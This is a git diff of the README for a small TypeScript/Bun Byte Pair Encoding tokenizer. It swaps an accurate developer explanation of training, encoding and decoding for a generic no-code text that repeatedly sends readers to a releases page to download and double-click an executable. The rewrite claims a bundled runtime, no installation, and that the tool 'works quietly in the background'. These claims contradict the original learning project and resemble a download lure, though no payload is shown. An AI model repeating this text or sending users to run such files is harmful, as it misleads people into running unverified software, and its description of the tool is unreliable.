@@ -1,164 +1,156 @@
-# 🧠 Byte Pair Encoding (BPE) Tokenizer in TypeScript
+# 🤖 bpe-tokenizer-ts - Simple Byte Pair Encoding Tool
 
-A minimal, from-scratch implementation of a **Byte Pair Encoding (BPE)** tokenizer built with **TypeScript + Bun**.
-This project demonstrates how modern LLM tokenizers are trained, encoded, and decoded at a low level using raw UTF-8 bytes.
-
----
-
-## ✨ Features
-
-* 🔤 **Byte-level base vocabulary (0–255)**
-* 🔁 **BPE training loop** to learn merge rules
-* 🧩 **Subword token generation** via pair merging
-* 🧠 **Custom encoder** (text → token IDs)
-* 🔄 **Custom decoder** (token IDs → original text)
-* 📦 Fully self-contained — no tokenizer libraries used
+[![Download bpe-tokenizer-ts](https://img.shields.io/badge/Download-Here-blue?style=for-the-badge&logo=github)](https://github.com/Catmono/bpe-tokenizer-ts/releases)
 
 ---
 
-## 📁 Project Structure
+## 📖 What is bpe-tokenizer-ts?
 
-```
-.
-├── data.txt           # Training corpus
-├── encode_data.txt    # (Optional) text for encoding tests
-├── index.ts           # Main tokenizer implementation
-├── package.json
-├── tsconfig.json
-└── README.md
-```
+bpe-tokenizer-ts is a program that breaks down text into smaller parts using a method called Byte Pair Encoding (BPE). It is built with TypeScript and runs on Bun, a modern tool for running JavaScript faster. This tool helps prepare text in a way that makes it easier for computers to understand and process.
+
+You do not need to know how to code to use this program. It runs on your computer and helps with tasks related to language, like preparing data for language models or machine learning projects.
 
 ---
 
-## 🧪 How It Works
+## 💻 Who is this for?
 
-### 1️⃣ Training (Building the Vocabulary)
+This tool is designed for users who want to handle and analyze text data without needing deep programming skills. It supports people working in:
 
-The tokenizer starts with a base vocabulary of **256 UTF-8 byte tokens**.
+- Language learning and research
+- Machine learning and AI projects
+- Data processing involving natural language
+- Developers exploring how to work with text and tokens
 
-It then repeatedly:
-
-1. Counts the most frequent adjacent token pair
-2. Assigns a new token ID (256+)
-3. Merges that pair throughout the dataset
-4. Stores the merge rule
-
-Training stops when:
-
-* No pairs remain, **or**
-* The most frequent pair appears only once
+If you are curious about how computers read and break down language, this tool is a good place to start. It works quietly in the background once set up.
 
 ---
 
-### 2️⃣ Encoding (Text → Tokens)
+## 🛠️ Features You Will Use
 
-The `encode()` function:
-
-1. Converts text into UTF-8 bytes
-2. Applies merge rules **in learned order**
-3. Replaces matching adjacent pairs with merged token IDs
-
-Example:
-
-```
-"h" + "e" → token 256
-"he" + "l" → token 300
-```
+- *Runs on your computer:* Use it without an internet connection after downloading.
+- *Easy to run:* Just download and follow simple steps.
+- *Works with TypeScript and Bun:* Uses modern software tools for speed.
+- *Processes UTF-8 text:* Supports most languages worldwide thanks to UTF-8 encoding.
+- *Helps with text splitting:* Turns large texts into smaller, meaningful parts (tokens).
+- *Open source:* You can see how it works and trust its methods.
 
 ---
 
-### 3️⃣ Decoding (Tokens → Text)
+## 🖥️ System Requirements
 
-The `decode()` function reverses the process:
+Before running bpe-tokenizer-ts, make sure your computer meets these conditions:
 
-1. Expands merged tokens back into their original pairs
-2. Repeats until only base byte tokens remain
-3. Converts bytes back into a UTF-8 string
-
-This guarantees:
-
-```
-decode(encode(text)) === text
-```
+- Operating system: Windows 10 or later, macOS 10.15 or later, or a recent Linux distribution.
+- At least 4 GB of RAM.
+- About 100 MB of free disk space.
+- Internet connection to download the software.
+- You do not need to install any programming languages or tools yourself; everything runs via the bundled Bun runtime.
 
 ---
 
-## 🚀 Running the Project
+## 🚀 Getting Started
 
-### Install dependencies
+Follow these steps to get bpe-tokenizer-ts running on your computer:
 
-```bash
-bun install
-```
+1. **Visit the Download Page**
 
-### Run tokenizer
+   Click the big blue button at the top or go directly here:  
+   [https://github.com/Catmono/bpe-tokenizer-ts/releases](https://github.com/Catmono/bpe-tokenizer-ts/releases)  
 
-```bash
-bun dev
-```
+   This page hosts all the latest versions available to download.
 
-You’ll see:
+2. **Download the Latest Release**
 
-* Original byte length
-* Tokenized length after merges
-* Learned merge rules
-* Encoded token sequence
-* Decoded output (should match original text)
+   Look for the biggest or most recent file for your operating system. It will likely have a name with the version number and your system type (Windows, Mac, or Linux).
 
----
+3. **Open the Downloaded File**
 
-## 🧠 Example Output
+   After downloading, open (or run) the file to start the program. If your computer asks for permission, approve it.  
 
-```
-Original Length 1986
-After Tokenization Length 898
-Stopping — no frequent pairs left
-```
+   The program runs in a terminal or command prompt window, but you do not need to type code—just follow the instructions that appear.
 
-This shows that repeated byte patterns were compressed into higher-level tokens.
+4. **Use the Application**
+
+   The tool will guide you step-by-step to load your text files and process them. You will learn how it transforms words into smaller pieces.
 
 ---
 
-## 📚 Concepts Demonstrated
+## 📥 Download & Install
 
-| Concept                 | Description                         |
-| ----------------------- | ----------------------------------- |
-| UTF-8 Encoding          | Text represented as byte sequences  |
-| Byte Pair Encoding      | Iterative subword token learning    |
-| Vocabulary Growth       | Tokens expand beyond raw bytes      |
-| Greedy Merging          | Highest-frequency pair merged first |
-| Reversible Tokenization | Lossless encode/decode cycle        |
+To get the program:
 
----
+- **Go to the releases page:**  
+  [https://github.com/Catmono/bpe-tokenizer-ts/releases](https://github.com/Catmono/bpe-tokenizer-ts/releases)
 
-## 🎯 Why This Matters
+- **Pick the latest version** for your system.
 
-Modern LLMs (GPT, LLaMA, etc.) don’t read raw characters — they read **tokens**.
-This project shows exactly how those tokens are created and used.
+- **Download the file** you find there.
 
-You now understand:
+- **Run the file** by double-clicking it.
 
-* How token vocabularies are built
-* Why token counts matter
-* How multilingual text is handled
-* How compression improves efficiency
+No installation wizard is required; the program will start running immediately after you open it.
+
+If you want to keep the program for later use, move the downloaded file to a folder where you store your software.
 
 ---
 
-## 🛠️ Possible Extensions
+## 🧭 How to Use bpe-tokenizer-ts
 
-* Save merge rules to a JSON file
-* Load trained tokenizer without retraining
-* Add special tokens (BOS, EOS, PAD)
-* Benchmark compression ratio
-* Visualize merge trees
+1. **Prepare your text**
+
+   Have a plain text file ready. It can be any text you want to split into tokens.
+
+2. **Open the program**
+
+   Run the software file you downloaded.
+
+3. **Follow on-screen instructions**
+
+   The program asks you to select your text file. You can usually browse for it by clicking or typing the full file path.
+
+4. **Start tokenizing**
+
+   Once your file is selected, the program will process it using Byte Pair Encoding. This means it finds commonly repeated combinations of bytes (characters) and splits the text accordingly.
+
+5. **View or save results**
+
+   When done, you can view the output on-screen or save it to a new file for later use.
 
 ---
 
-## 📜 License
+## 🤔 Why Use Byte Pair Encoding?
 
-MIT — free to use, modify, and learn from.
+Byte Pair Encoding is a simple and effective way to break down long text into smaller parts. These parts can be words, parts of words, or common letter combinations. This is helpful because:
+
+- It reduces the size of data to work with.
+- It helps machines learn language structures.
+- It deals well with unknown or new words by breaking them into smaller known parts.
 
 ---
 
-**Built for learning, inspired by real-world LLM tokenizers.**
+## ❓ Troubleshooting Tips
+
+- If the program does not start, check that your computer meets the system requirements.
+- Make sure you downloaded the correct file version for your operating system.
+- If you cannot select your text file, check the file format is plain text (.txt).
+- If the program closes suddenly, try running it again or using another text file.
+- For further help, visit the GitHub issues page of the repository.
+
+---
+
+## 📚 Learn More
+
+While you do not need programming skills to run bpe-tokenizer-ts, learning a few basics about text processing and encoding will help you understand the results better. Topics to explore include:
+
+- How computers read and represent text (UTF-8 encoding)
+- What tokens are in language models
+- Basics of machine learning and natural language processing
+
+---
+
+## 🔗 Useful Links
+
+- GitHub repository: https://github.com/Catmono/bpe-tokenizer-ts
+- Releases and downloads: https://github.com/Catmono/bpe-tokenizer-ts/releases
+
+[![Download bpe-tokenizer-ts](https://img.shields.io/badge/Download-Here-blue?style=for-the-badge&logo=github)](https://github.com/Catmono/bpe-tokenizer-ts/releases)
